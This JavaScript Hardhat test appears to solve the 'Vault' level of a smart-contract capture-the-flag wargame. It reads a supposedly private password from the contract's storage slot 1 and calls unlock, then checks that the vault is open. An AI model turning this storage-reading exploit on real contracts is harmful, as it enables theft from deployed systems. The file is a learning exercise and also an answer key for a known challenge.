const { ethers } = require("hardhat")
const { assert } = require("chai")

/* 
    Enter the contract address below.
    Use `await contract.address in the console to get the address.
*/
const CONTRACT_ADDRESS = "0x4B1099449E9532f4a4a4ba03D489662a450F0773"

describe("08 Vault", function () {
    let player, challengeContract

    before(async function () {
        ;[player] = await ethers.getSigners()
        challengeContract = await ethers.getContractAt(
            "Vault",
            CONTRACT_ADDRESS,
            player
        )
        const isLockedBefore = await challengeContract.locked()
        await assert.equal(isLockedBefore.toString(), true.toString())
    })

    it("Execution", async function () {
        const password = await ethers.provider.getStorageAt(
            challengeContract.address,
            1
        )
        const txResponse = await challengeContract.unlock(password)
        await txResponse.wait(1)
    })

    after(async function () {
        const isLockedAfter = await challengeContract.locked()
        await assert.equal(isLockedAfter.toString(), false.toString())
    })
})
